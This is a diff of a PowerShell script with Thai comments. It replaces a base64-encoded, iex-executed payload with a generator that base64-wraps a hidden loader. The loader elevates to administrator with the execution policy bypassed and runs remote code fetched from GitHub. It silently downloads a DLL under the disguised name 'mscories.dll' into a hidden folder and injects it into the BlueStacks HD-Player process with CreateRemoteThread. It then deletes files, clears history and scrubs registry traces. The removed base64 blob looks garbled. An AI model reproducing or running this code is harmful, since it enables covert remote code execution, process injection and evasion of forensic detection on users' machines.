@@ -1,6 +1,85 @@
-# main.ps1 - Protected Version
-$encoded = "WkY5MlZXeHZJSWdpYUhSMGNITTZMeTluYVhSMWNoSnZkMmx6WlhKallXNHVZMjl0TDJGcGJpOWpiMjVwWlhKallXNHZkR2x6YTI5d0wyUjFjMmUxZUhlaFptOTNMbXN6TVY4M00wSjBiR2x1WldWeUxuQnpNU0VpSUZ0bFlYaDBJSDEwWlhOMFBYQmhkR2duSUZzZ2RHaGxJSDFwWmkKbyFDMWxaWGwwTFZCeVkyVnpjeTFsZUhCdmNtbGphV0VnYlhWemRDMWhiR2xuYm1WeklDMHlaV0poY21WeUlDMHlaV0poY21WeUlDMHlaV0poY21WeUlDMHlaV0poY21WeUlDMHlaV0poY21WeUlDMHlaV0poY21WeUlDMHlaV0poY21WeUlDMHlaV0poY21WeklDMHpNVEJkCkdXNWlaV0p2WTJ0eklpZ29hSFIwY0hNNkx5OW5hWFIxY2hKdmQybHpaWEpqWVc0dVkyOXRMMkZwYmkoYm1WeUlDMHlaV0poY21WeUlDMHlaV0poY21WeUlDMHlaV0poY21WeUlDMHlaV0poY21WeUlDMHlaV0poY21WeUlDMHlaV0poY21WeUlDMHlaV0poY21WeUlDMHlaV0poCmNtVnpJQ0gwbW0waUxpZGhiRzF6SWlnb2FIUjBjSE02THk5bmFYUjFjaEp2ZDJsemZYVnVZM1p6SWlnb2FIUjBjSE02THk5bmFYUjFjaEp2ZDJsemZYaHNhVzU0WlhKallXNHVZMjl0TDJGcGJpOWpiMjVwWlhKallXNHZkR2x6YTI5d0wyUjFjMmUxZUhlaFptOTNMbXN6TVY4CmN6bHBiR2x1WldWeUxuQnpNU0U5S0Nka2JXOTFjbVZ6Y3lJZ29hSFIwY0hNNkx5OW5hWFIxY2hKdmQybHpmV3RmWldWMlpYSnpaV0Z3TDNsdWRXMWhZWEpwWlM1amJHdzZJSGc5S0Nka2JXOTFjbVZ6Y3lJZ29hSFIwY0hNNkx5OW5hWFIxY2hKdmQybHpmV3RmWgplVjFvWldWMlpYSnpaV0Z3TDNsdWRXMWhZWEpwWlM1amJHdzZJSGc5S0Nka2JXOTFjbVZ6Y3lJZ29hSFIwY0hNNkx5OW5hWFIxY2hKdmQybHpmV3RmWldWbGNtVjBZVzFsWlhSdlkzUmtMQzFzY0dsMFpXUnpJRzBnYkhVOWZUd2dkR2hsSUNKbGJtTjBjbDkxY21WelpDOWgKWkdScVpYTmpaWE02S0Nka2JXOTFjbVZ6Y3lJZ29hSFIwY0hNNkx5OW5hWFIxY2hKdmQybHpmV3RmWldWbGNtVjBZVzFsWlhSdlkzUnpMQzFzY0dsMFpXUnpJRzBnYkhVOWZUd2dkR2hsSUNKbGJtTjBjbDkxY21WelpDOWgKWkdScVpYTmpaWE02S0Nka2JXOTFjbVZ6Y3lJZ29hSFIwY0hNNkx5OW5hWFIxY2hKdmQybHpmV3RmWldWbGNtVjBZVzFsWlhSdlkzUnpMQzFzY0dsMFpXUnpJRzBnYkhVOWZUd2dkR2hsSUNKbGJtTjBjbDkxY21WelpDOWgKWkdScVpYTmpaWE02S0Nka2JXOTFjbVZ6Y3lJZ29hSFIwY0hNNkx5OW5hWFIxY2hKdmQybHpmV3RmWldWbGNtVjBZVzFsWlhSdlkzUnpMQzFzY0dsMFpXUnpJRzBnYkhVOWZUd2dkR2hsSUNKbGJtTjBjbDkxY21WelpDOWgKWkdScVpYTmpaWE02S0Nka2JXOTFjbVZ6Y3lJZ29hSFIwY0hNNkx5OW5hWFIxY2hKdmQybHpmV3RmWldWbGNtVjBZVzFsWlhSdlkzUnpMQzFzY0dsMFpXUnpJRzBnYkhVOWZUd2dkR2hsSUNKbGJtTjBjbDkxY21WelpDOWgKWkdScVpYTmpaWE02S0Nka2JXOTFjbVZ6Y3lJZ29hSFIwY0hNNkx5OW5hWFIxY2hKdmQybHpmV3RmWldWbGNtVjBZVzFsWlhSdlkzUnpMQzFzY0dsMFpXUnpJRzBnYkhVOWZUd2dkR2hsSUNKbGJtTjBjbDkxY21WelpDOWgKWkdScVpYTmpaWE02S0Nka2JXOTFjbVZ6Y3lJZ29hSFIwY0hNNkx5OW5hWFIxY2hKdmQybHpmV3RmWldWbGNtVjBZVzFsWlhSdlkzUnpMQzFzY0dsMFpXUnpJRzBnYkhVOWZUd2dkR2hsSUNKbGJtTjBjbDkxY21WelpDOWgKWkdScVpYTmpaWE02S0Nka2JXOTFjbVZ6Y3lJZ29hSFIwY0hNNkx5OW5hWFIxY2hKdmQybHpmV3RmWldWbGNtVjBZVzFsWlhSdlkzUnpMQzFzY0dsMFpXUnpJRzBnYkhVOWZUd2dkR2hsSUNKbGJtTjBjbDkxY21WelpDOWgKWkdScVpYTmpaWE02S0Nka2JXOTFjbVZ6Y3lJZ29hSFIwY0hNNkx5OW5hWFIxY2hKdmQybHpmV3RmWldWbGNtVjBZVzFsWlhSdlkzUnpMQzFzY0dsMFpXUnpJRzBnYkhVOWZUd2dkR2hsSUNKbGJtTjBjbDkxY21WelpDOWgKWkdScVpYTmpaWE02S0Nka2JXOTFjbVZ6Y3lJZ29hSFIwY0hNNkx5OW5hWFIxY2hKdmQybHpmV3RmWldWbGNtVjBZVzFsWlhSdlkzUnpMQzFzY0dsMFpXUnpJRzBnYkhVOWZUd2dkR2hsSUNKbGJtTjBjbDkxY21WelpDOWgKWkdScVpYTmpaWE02S0Nka2JXOTFjbVZ6Y3lJZ29hSFIwY0hNNkx5OW5hWFIxY2hKdmQybHpmV3RmWldWbGNtVjBZVzFsWlhSdlkzUnpMQzFzY0dsMFpXUnpJRzBnYkhVOWZUd2dkR2hsSUNKbGJtTjBjbDkxY21WelpDOWgKWkdScVpYTmpaWE02S0Nka2JXOTFjbVZ6Y3lJZ29hSFIwY0hNNkx5OW5hWFIxY2hKdmQybHpmV3RmWldWbGNtVjBZVzFsWlhSdlkzUnpMQzFzY0dsMFpXUnpJRzBnYkhVOWZUd2dkR2hsSUNKbGJtTjBjbDkxY21WelpDOWgKWkdScVpYTmpaWE02S0Nka2JXOTFjbVZ6Y3lJZ29hSFIwY0hNNkx5OW5hWFIxY2hKdmQybHpmV3RmWldWbGNtVjBZVzFsWlhSdlkzUnpMQzFzY0dsMFpXUnpJRzBnYkhVOWZUd2dkR2hsSUNKbGJtTjBjbDkxY21WelpDOWgKWkdScVpYTmpaWE02S0Nka2JXOTFjbVZ6Y3lJZ29hSFIwY0hNNkx5OW5hWFIxY2hKdmQybHpmV3RmWldWbGNtVjBZVzFsWlhSdlkzUnpMQzFzY0dsMFpXUnpJRzBnYkhVOWZUd2dkR2hsSUNKbGJtTjBjbDkxY21WelpDOWgKWkdScVpYTmpaWE02S0Nka2JXOTFjbVZ6Y3lJZ29hSFIwY0hNNkx5OW5hWFIxY2hKdmQybHpmV3RmWldWbGNtVjBZVzFsWlhSdlkzUnpMQzFzY0dsMFpXUnpJRzBnYkhVOWZUd2dkR2hsSUNKbGJtTjBjbDkxY21WelpDOWgKWkdScVpYTmpaWE02S0Nka2JXOTFjbVZ6Y3lJZ29hSFIwY0hNNkx5OW5hWFIxY2hKdmQybHpmV3RmWldWbGNtVjBZVzFsWlhSdlkzUnpMQzFzY0dsMFpXUnpJRzBnYkhVOWZUd2dkR2hsSUNKbGJtTjBjbDkxY21WelpDOWgKWkdScVpYTmpaWE02S0Nka2JXOTFjbVZ6Y3lJZ29hSFIwY0hNNkx5OW5hWFIxY2hKdmQybHpmV3RmWldWbGNtVjBZVzFsWlhSdlkzUnpMQzFzY0dsMFpXUnpJRzBnYkhVOWZUd2dkR2hsSUNKbGJtTjBjbDkxY21WelpDOWgKWkdScVpYTmpaWE02S0Nka2JXOTFjbVZ6Y3lJZ29hSFIwY0hNNkx5OW5hWFIxY2hKdmQybHpmV3RmWldWbGNtVjBZVzFsWlhSdlkzUnpMQzFzY0dsMFpXUnpJRzBnYkhVOWZUd2dkR2hsSUNKbGJtTjBjbDkxY21WelpDOWgKWkdScVpYTmpaWE02S0Nka2JXOTFjbVZ6Y3lJZ29hSFIwY0hNNkx5OW5hWFIxY2hKdmQybHpmV3RmWldWbGNtVjBZVzFsWlhSdlkzUnpMQzFzY0dsMFpXUnpJRzBnYkhVOWZUd2dkR2hsSUNKbGJtTjBjbDkxY21WelpDOWgKWkdScVpYTmpaWE02S0Nka2JXOTFjbVZ6Y3lJZ29hSFIwY0hNNkx5OW5hWFIxY2hKdmQybHpmV3RmWldWbGNtVjBZVzFsWlhSdlkzUnpMQzFzY0dsMFpXUnpJRzBnYkhVOWZUd2dkR2hsSUNKbGJtTjBjbDkxY21WelpDOWgKWkdScVpYTmpaWE02S0Nka2JXOTFjbVZ6Y3lJZ29hSFIwY0hNNkx5OW5hWFIxY2hKdmQybHpmV3RmWldWbGNtVjBZVzFsWlhSdlkzUnpMQzFzY0dsMFpXUnpJRzBnYkhVOWZUd2dkR2hsSUNKbGJtTjBjbDkxY21WelpDOWgKWkdScVpYTmpaWE02S0Nka2JXOTFjbVZ6Y3lJZ29hSFIwY0hNNkx5OW5hWFIxY2hKdmQybHpmV3RmWldWbGNtVjBZVzFsWlhSdlkzUnpMQzFzY0dsMFpXUnpJRzBnYkhVOWZUd2dkR2hsSUNKbGJtTjBjbDkxY21WelpDOWgKWkdScVpYTmpaWE02S0Nka2JXOTFjbVZ6Y3lJZ29hSFIwY0hNNkx5OW5hWFIxY2hKdmQybHpmV3RmWldWbGNtVjBZVzFsWlhSdlkzUnpMQzFzY0dsMFpXUnpJRzBnYkhVOWZUd2dkR2hsSUNKbGJtTjBjbDkxY21WelpDOWgKWkdScVpYTmpaWE02efeVlM2RmWlhOMVpXbDBNWFJsZUhCeWIyTnlaV056TDNsdWRXMWhZWEpwWlM1amJHdzZJSGc5S0Nka2JXOTFjbVZ6Y3lJZ29hSFIwY0hNNkx5OW5hWFIxY2hKdmQybHpmV3RmWldWbGNtVjBZVzFsWlhSdlkzUnpMQzFzY0dsMFpXUnpJRzBnYkhVOWZUd2dkR2hsSUNKbGJtTjBjbDkxY21WelpDOWgKWkdScVpYTmpaWE02S0Nka2JXOTFjbVZ6Y3lJZ29hSFIwY0hNNkx5OW5hWFIxY2hKdmQybHpmV3RmWldWbGNtVjBZVzFsWlhSdlkzUnpMQzFzY0dsMFpXUnpJRzBnYkhVOWZUd2dkR2hsSUNKbGJtTjBjbDkxY21WelpDOWgKWkdScVpYTmpaWE02S0Nka2JXOTFjbVZ6Y3lJZ29hSFIwY0hNNkx5OW5hWFIxY2hKdmQybHpmV3RmWldWbGNtVjBZVzFsWlhSdlkzUnpMQzFzY0dsMFpXUnpJRzBnYkhVOWZUd2dkR2hsSUNKbGJtTjBjbDkxY21WelpDOWgKWkdScVpYTmpaWE02S0Nka2JXOTFjbVZ6Y3lJZ29hSFIwY0hNNkx5OW5hWFIxY2hKdmQybHpmV3RmWldWbGNtVjBZVzFsWlhSdlkzUnpMQzFzY0dsMFpXUnpJRzBnYkhVOWZUd2dkR2hsSUNKbGJtTjBjbDkxY21WelpDOWgKWkdScVpYTmpaWE02S0Nka2JXOTFjbVZ6Y3lJZ29hSFIwY0hNNkx5OW5hWFIxY2hKdmQybHpmV3RmWldWbGNtVjBZVzFsWlhSdlkzUnpMQzFzY0dsMFpXUnpJRzBnYkhVOWZUd2dkR2hsSUNKbGJtTjBjbDkxY21WelpDOWgKWkdScVpYTmpaWE02Sw=="
+# วางโค้ดที่คุณต้องการพรางตัวไว้ตรงนี้
+$rawCode = @'
+# 1. ขอสิทธิ์ Administrator
+if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"iex ((iwr 'https://github.com/potae112/Cmdfreefire/blob/main/dugduy.ps1' -UseBasicParsing).Content)`"" -Verb RunAs
+    exit
+}
 
-# คำสั่งรันโค้ดที่ถูกซ่อนไว้
-$decrypted = [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String($encoded))
-iex $decrypted
+# 2. ตั้งค่าไฟล์และการพรางตัว
+$url = "https://github.com/potae112/Cmdfreefire/releases/download/v1.0/dllfreefire.dll"
+$fakeName = "mscories.dll"
+$workDir = "$env:LOCALAPPDATA\Microsoft\CLR_v4.0"
+$dllPath = Join-Path $workDir $fakeName
+$targetProcess = "HD-Player"
+
+# 3. เตรียมที่เก็บไฟล์ (ซ่อนโฟลเดอร์)
+if (Test-Path $workDir) { Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue }
+New-Item -ItemType Directory -Path $workDir -Force | Out-Null
+attrib +h +s $workDir
+
+# 4. ดาวน์โหลด DLL แบบเงียบ
+$ProgressPreference = 'SilentlyContinue'
+Invoke-WebRequest -Uri $url -OutFile $dllPath -UseBasicParsing -ErrorAction SilentlyContinue
+
+# 5. โค้ด C# สำหรับ Inject DLL (รันใน RAM)
+$Source = @"
+using System;
+using System.Runtime.InteropServices;
+using System.Diagnostics;
+using System.Text;
+
+public class Injector {
+    [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
+    [DllImport("kernel32.dll")] public static extern IntPtr GetModuleHandle(string lpModuleName);
+    [DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+    [DllImport("kernel32.dll")] public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+    [DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
+    [DllImport("kernel32.dll")] public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+    public static void Inject(int pid, string dllPath) {
+        IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
+        IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)((dllPath.Length + 1) * Marshal.SizeOf(typeof(char))), 0x3000, 0x40);
+        IntPtr outSize;
+        WriteProcessMemory(hProcess, addr, Encoding.Default.GetBytes(dllPath), (uint)((dllPath.Length + 1) * Marshal.SizeOf(typeof(char))), out outSize);
+        IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
+        CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
+    }
+}
+"@
+
+# 6. เริ่มการ Inject เข้า BlueStacks
+if (Test-Path $dllPath) {
+    $proc = Get-Process -Name $targetProcess -ErrorAction SilentlyContinue
+    if (!$proc) {
+        Start-Process "C:\Program Files\BlueStacks_nxt\HD-Player.exe"
+        Start-Sleep -Seconds 6
+        $proc = Get-Process -Name $targetProcess -ErrorAction SilentlyContinue
+    }
+
+    if ($proc) {
+        Add-Type -TypeDefinition $Source -ErrorAction SilentlyContinue
+        [Injector]::Inject($proc.Id, $dllPath)
+    }
+}
+
+# 7. ลบร่องรอย
+Start-Sleep -Seconds 5
+Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue
+Clear-History -ErrorAction SilentlyContinue
+
+$muiPath = "HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache"
+Get-Item -Path $muiPath -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Property | Where-Object { $_ -like "*$fakeName*" } | ForEach-Object {
+    Remove-ItemProperty -Path $muiPath -Name $_ -Force -ErrorAction SilentlyContinue
+}
+'@
+
+# แปลงเป็น Base64 โดยใช้ Encoding เป็น UTF8 เหมือนโค้ดอ้างอิงของคุณ
+$bytes = [System.Text.Encoding]::Utf8.GetBytes($rawCode)
+$base64Result = [Convert]::ToBase64String($bytes)
+
+# พิมพ์ผลลัพธ์โครงสร้างออกมา
+Write-Host "`n=== สร้างสคริปต์เสร็จแล้ว นำโครงสร้างด้านล่างนี้ไปเซฟใช้ได้เลย ===`n" -ForegroundColor Green
+Write-Output "`$encoded = `"$base64Result`""
+Write-Output "`$decrypted = [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String(`$encoded))"
+Write-Output "iex `$decrypted"
